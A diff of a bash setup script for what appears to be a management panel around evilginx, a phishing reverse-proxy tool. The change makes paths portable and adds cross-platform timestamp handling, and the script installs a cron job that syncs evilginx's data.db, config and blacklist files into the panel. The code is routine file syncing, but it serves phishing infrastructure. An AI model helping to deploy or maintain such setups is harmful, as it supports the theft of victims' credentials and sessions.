@@ -1,21 +1,18 @@
 #!/bin/bash
 
-# Paths for VPS environment
-HOME_DIR=$HOME
-EVILGINX_DIR="$HOME_DIR/.evilginx"
-EVILGINX_DB="$EVILGINX_DIR/data.db"
-SOURCE_DIR="$HOME_DIR/.evilginx"
-SOURCE_DB="$SOURCE_DIR/data.db"
-PANEL_DIR="/root/myginx/panel"
+# Get current script directory
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+PANEL_DIR="$( cd "$SCRIPT_DIR/.." && pwd )"
+WORKSPACE_DIR="$( cd "$PANEL_DIR/../.." && pwd )"
+EVILGINX_DIR="$WORKSPACE_DIR/.evilginx"
 DATA_DIR="$PANEL_DIR/data"
-LOCAL_DB="$DATA_DIR/data.db"
-CURRENT_USER="root"
-GROUP="root"
+CURRENT_USER=$(whoami)
+GROUP=$(id -gn)
 
 echo "=== Setting up evilginx permissions ==="
-echo "Home directory: $HOME_DIR"
+echo "Workspace directory: $WORKSPACE_DIR"
 echo "Evilginx directory: $EVILGINX_DIR"
-echo "Source directory: $SOURCE_DIR"
+echo "Panel directory: $PANEL_DIR"
 echo "Panel data directory: $DATA_DIR"
 echo "Current user: $CURRENT_USER"
 echo "Group: $GROUP"
@@ -26,13 +23,6 @@ mkdir -p "$EVILGINX_DIR"
 chmod 755 "$EVILGINX_DIR"
 chown $CURRENT_USER:$GROUP "$EVILGINX_DIR"
 echo "Evilginx directory ready: $EVILGINX_DIR"
-
-# Ensure source directory exists with proper permissions
-echo "Ensuring source directory exists with proper permissions..."
-mkdir -p "$SOURCE_DIR"
-chmod 755 "$SOURCE_DIR"
-chown $CURRENT_USER:$GROUP "$SOURCE_DIR"
-echo "Source directory ready: $SOURCE_DIR"
 
 # Ensure panel data directory exists with proper permissions
 echo "Ensuring panel data directory exists with proper permissions..."
@@ -81,18 +71,18 @@ sync_file() {
 }
 
 # Sync data.db
-sync_file "$SOURCE_DB" "$LOCAL_DB" "data.db"
+sync_file "$EVILGINX_DIR/data.db" "$DATA_DIR/data.db" "data.db"
 
 # Sync config.json
-sync_file "$SOURCE_DIR/config.json" "$DATA_DIR/config.json" "config.json"
+sync_file "$EVILGINX_DIR/config.json" "$DATA_DIR/config.json" "config.json"
 
 # Sync blacklist.txt
-sync_file "$SOURCE_DIR/blacklist.txt" "$DATA_DIR/blacklist.txt" "blacklist.txt"
+sync_file "$EVILGINX_DIR/blacklist.txt" "$DATA_DIR/blacklist.txt" "blacklist.txt"
 
 # Create crt directory if it doesn't exist
-mkdir -p "$SOURCE_DIR/crt"
-chmod 755 "$SOURCE_DIR/crt"
-chown $CURRENT_USER:$GROUP "$SOURCE_DIR/crt"
+mkdir -p "$EVILGINX_DIR/crt"
+chmod 755 "$EVILGINX_DIR/crt"
+chown $CURRENT_USER:$GROUP "$EVILGINX_DIR/crt"
 
 # Set up cron job to periodically sync files (every 1 minute)
 echo "Setting up cron job for automatic file syncing..."
@@ -109,16 +99,17 @@ crontab "$TEMP_CRON_FILE"
 rm "$TEMP_CRON_FILE"
 
 # Create the sync_files.sh script
-cat > "$DATA_DIR/sync_files.sh" << 'EOT'
+cat > "$DATA_DIR/sync_files.sh" << 'EOF'
 #!/bin/bash
 
-HOME_DIR=$HOME
-EVILGINX_DIR="$HOME_DIR/.evilginx"
-SOURCE_DIR="$HOME_DIR/.evilginx"
-PANEL_DIR="/root/myginx/panel"
+# Get current script directory
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+PANEL_DIR="$( cd "$SCRIPT_DIR/.." && pwd )"
+WORKSPACE_DIR="$( cd "$PANEL_DIR/../.." && pwd )"
+EVILGINX_DIR="$WORKSPACE_DIR/.evilginx"
 DATA_DIR="$PANEL_DIR/data"
-CURRENT_USER="root"
-GROUP="root"
+CURRENT_USER=$(whoami)
+GROUP=$(id -gn)
 
 # Function to sync a file based on which is newer
 sync_newest_file() {
@@ -137,9 +128,22 @@ sync_newest_file() {
     chown $CURRENT_USER:$GROUP "$file2"
   else
     # Both files exist, compare timestamps
-    # Linux stat command format (-c instead of macOS -f)
-    file1_time=$(stat -c "%Y" "$file1")
-    file2_time=$(stat -c "%Y" "$file2")
+    # Try to use stat in a way that works on both Linux and macOS
+    if command -v stat &> /dev/null; then
+      if stat --version &> /dev/null; then
+        # Linux stat
+        file1_time=$(stat -c "%Y" "$file1")
+        file2_time=$(stat -c "%Y" "$file2")
+      else
+        # macOS stat
+        file1_time=$(stat -f "%m" "$file1")
+        file2_time=$(stat -f "%m" "$file2")
+      fi
+    else
+      # If stat is unavailable, use date command on file
+      file1_time=$(date -r "$file1" +%s)
+      file2_time=$(date -r "$file2" +%s)
+    fi
     
     if [ "$file1_time" -gt "$file2_time" ]; then
       cp "$file1" "$file2"
@@ -154,13 +158,13 @@ sync_newest_file() {
 }
 
 # Sync data.db
-sync_newest_file "$SOURCE_DIR/data.db" "$DATA_DIR/data.db"
+sync_newest_file "$EVILGINX_DIR/data.db" "$DATA_DIR/data.db"
 
 # Sync config.json
-sync_newest_file "$SOURCE_DIR/config.json" "$DATA_DIR/config.json"
+sync_newest_file "$EVILGINX_DIR/config.json" "$DATA_DIR/config.json"
 
 # Sync blacklist.txt
-sync_newest_file "$SOURCE_DIR/blacklist.txt" "$DATA_DIR/blacklist.txt"
+sync_newest_file "$EVILGINX_DIR/blacklist.txt" "$DATA_DIR/blacklist.txt"
 
 # Check if Evilginx needs to be restarted
 RESTART_FLAG="/tmp/evilginx_needs_restart"
@@ -179,7 +183,7 @@ if [ -f "$RESTART_FLAG" ]; then
   # Remove the restart flag
   rm "$RESTART_FLAG"
 fi
-EOT
+EOF
 
 chmod +x "$DATA_DIR/sync_files.sh"
 chown $CURRENT_USER:$GROUP "$DATA_DIR/sync_files.sh"
